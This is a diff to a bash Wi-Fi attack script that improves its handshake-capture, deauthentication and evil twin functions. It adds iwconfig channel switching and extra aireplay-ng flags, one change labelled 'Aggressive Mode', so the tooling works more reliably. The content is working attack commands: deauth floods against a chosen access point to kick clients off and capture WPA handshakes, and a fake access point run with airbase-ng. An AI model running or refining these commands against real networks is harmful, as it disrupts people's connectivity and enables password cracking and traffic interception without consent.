@@ -166,6 +166,10 @@ capture_handshake() {
     
     local output_file="$OUTPUT_DIR/handshake_$(date +%Y%m%d_%H%M%S)"
     
+    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
+    iwconfig "$MONITOR_INTERFACE" channel "$channel"
+    sleep 1
+
     log_info "Capturing handshake for $bssid on channel $channel"
     log_info "Output: $output_file"
     echo ""
@@ -176,9 +180,9 @@ capture_handshake() {
     
     sleep 3
     
-    # Send deauth packets
+    # Send deauth packets (Aggressive Mode)
     log_info "Sending deauth packets..."
-    aireplay-ng --deauth 10 -a "$bssid" "$MONITOR_INTERFACE"
+    aireplay-ng --deauth 10 -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
     
     sleep 2
     kill $airodump_pid 2>/dev/null
@@ -227,8 +231,8 @@ deauth_attack() {
     fi
     echo ""
     
-    # -D disables AP selection check (useful if we already set channel)
-    aireplay-ng --deauth "$count" -a "$bssid" -D "$MONITOR_INTERFACE"
+    # -D disables AP selection check, --ignore-negative-one fixes channel -1 issue
+    aireplay-ng --deauth "$count" -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
 }
 
 # Evil Twin attack
@@ -263,6 +267,10 @@ evil_twin() {
     log_info "Starting Basic Evil Twin AP using airbase-ng..."
     
     enable_monitor_mode
+
+    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
+    iwconfig "$MONITOR_INTERFACE" channel "$channel"
+    sleep 1
     
     log_info "Broadcasting SSID: $ssid on channel $channel"
     log_warning "This creates a fake AP. Clients may connect, but won't have internet access"
